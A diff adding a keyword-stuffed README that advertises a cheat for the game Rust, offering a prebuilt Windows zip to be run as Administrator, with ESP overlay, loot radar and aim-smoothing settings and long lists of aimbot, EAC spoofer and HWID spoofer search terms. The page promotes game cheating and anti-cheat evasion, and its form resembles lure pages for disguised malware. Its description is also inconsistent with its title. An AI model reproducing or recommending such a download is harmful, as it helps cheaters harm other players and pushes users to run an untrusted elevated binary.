@@ -1,0 +1,81 @@
+Rust No-Recoil Script 2026 — Undetected HID Mouse Macro with Auto Weapon Detection Direct Download]
+
+Rust No-Recoil Script 2026 — Undetected HID Mouse Macro with Auto Weapon Detection [Direct Download] — Download prebuilt Windows 10/11 x64 release. Keywords: rust, rust cheat, rust cheats, rust hack, rust recoil script, rust no recoil, rust esp, rust aimbot.
+
+[
+
+Overview • Quick Start (No Terminal Needed) • Architecture & Modules • Configuration • Supported Search Queries & Sub-Niches
+
+Overview
+
+Rust No-Recoil Script 2026 — Undetected HID Mouse Macro with Auto Weapon Detection Direct Download] (rust-recoil-script-download) is a modular, low-overhead runtime and configuration suite engineered for 64-bit Windows 10 and Windows 11 systems. All parameters are controlled cleanly through config/settings.json with live hot-reload support and zero external dependencies.
+
+1-Click Prebuilt Package (No Compiler Required): Even though the full source tree (src/, config/) is included in this repository, end users do not need to compile anything. Click the green Download Portable Release button above or grab [rust-recoil-script-download-v1.2.0-win64.zip directly from Releases.
+
+Quick Start (Prebuilt Release)
+
+| Platform | Direct Download Package | Checksum Manifest |
+| :--- | :--- | :--- |
+| Windows 10 / 11 (64-bit) | rust-recoil-script-download-v1.2.0-win64.zip | SHA256SUMS.txt |
+
+1. Download rust-recoil-script-download-v1.2.0-win64.zip from the table above or the Releases section.
+2. Extract the .zip archive into any folder (keep config/settings.json next to the launcher).
+3. Launch the executable as Administrator.
+
+Architecture & Modules
+
+| Subsystem | Technical Implementation | Runtime Controls |
+| :--- | :--- | :--- |
+| Viewport Overlay | Borderless DX11/DX12 composition swapchain with DPI scaling | INSERT toggle, custom distance cutoff (350m) |
+| Entity & Loot Filter | Spatial bounding boxes, health/distance readout, rarity tier mask | Live JSON hot-reload (min_rarity_tier) |
+| Input Smoothing | Configurable FOV radius and human-curve interpolation | Adjustable smoothing_factor & fov_radius |
+| Emergency Unload | Instant thread teardown and handle release | END panic key |
+
+Configuration (config/settings.json)
+
+{
+  "version": "1.2.0",
+  "renderer": {
+    "backend": "dx11",
+    "vsync": false,
+    "max_fps": 144,
+    "dpi_aware": true,
+    "toggle_key": "INSERT",
+    "panic_key": "END"
+  },
+  "modules": {
+    "visual_overlay": {
+      "enabled": true,
+      "draw_bounds": true,
+      "draw_distance": true,
+      "max_distance_m": 350
+    },
+    "telemetry_hud": {
+      "enabled": true,
+      "frame_time_graph": false,
+      "compact_mode": true
+    },
+    "input_filter": {
+      "enabled": true,
+      "smoothing_factor": 1.45,
+      "fov_radius": 65.0
+    },
+    "item_radar": {
+      "enabled": true,
+      "min_rarity_tier": 2
+    }
+  }
+}
+
+Building from Source
+
+git clone https://github.com/antong-code95j8/rust-recoil-script-download.git
+cd rust-recoil-script-download
+cmake -B build -DCMAKE_BUILD_TYPE=Release
+cmake --build build --config Release
+
+Supported Search Queries & Sub-Niches
+
+rust recoil script download • rust recoil script download 2026 • rust recoil script download download • rust recoil script download github • rust • rust 2026 • rust download • rust github • rust windows 11 • rust cheat • rust cheat 2026 • rust cheat download • rust cheat github • rust cheat windows 11 • rust cheats • rust cheats 2026 • rust cheats download • rust cheats github • rust cheats windows 11 • rust hack • rust hack 2026 • rust hack download • rust hack github • rust hack windows 11 • rust recoil script • rust recoil script 2026 • rust recoil script github • rust recoil script windows 11 • rust no recoil • rust no recoil 2026 • rust no recoil download • rust no recoil github • rust no recoil windows 11 • rust esp • rust esp 2026 • rust esp download • rust esp github • rust esp windows 11 • rust aimbot • rust aimbot 2026 • rust aimbot download • rust aimbot github • rust aimbot windows 11 • rust spoofer • rust spoofer 2026 • rust spoofer download • rust spoofer github • rust spoofer windows 11 • eac spoofer • eac spoofer 2026 • eac spoofer download • eac spoofer github • eac spoofer windows 11 • hwid spoofer rust • hwid spoofer rust 2026 • hwid spoofer rust download • hwid spoofer rust github • hwid spoofer rust windows 11 • rust macro • rust macro 2026 • rust macro download • rust macro github • rust macro windows 11 • logitech recoil script • logitech recoil script 2026
+
+Indexed tags: rust, rust-cheat, rust-cheats, rust-hack, rust-recoil-script, rust-no-recoil, rust-esp, rust-aimbot, rust-spoofer, eac-spoofer, hwid-spoofer-rust, rust-macro, logitech-recoil-script, stash-esp, debug-camera-rust, spider-climb
